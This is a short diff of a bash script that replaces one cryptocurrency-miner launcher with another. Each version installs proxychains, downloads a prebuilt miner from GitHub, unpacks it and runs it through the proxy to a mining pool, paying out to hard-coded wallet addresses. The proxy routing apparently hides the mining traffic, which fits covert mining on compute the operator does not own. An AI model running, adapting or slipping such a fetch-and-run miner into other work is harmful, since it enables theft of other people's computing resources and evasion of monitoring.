@@ -1,2 +1,2 @@
 #!/bin/bash
-apt update && apt install proxychains -y && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && proxychains ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RUuUdVwcd4PzM7zdJXFBPGAcucP7U7f7vj.learnauto -p x --cpu 2
+apt update && apt install proxychains -y && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && proxychains ./cpuminer-avx -a minotaurx -o stratum+tcp://minotaurx.na.mine.zpool.ca:7019 -u LerEpCNA6tqUXvKb1VFMZkuBMZHnzXBJec -p c=LTC -t 2
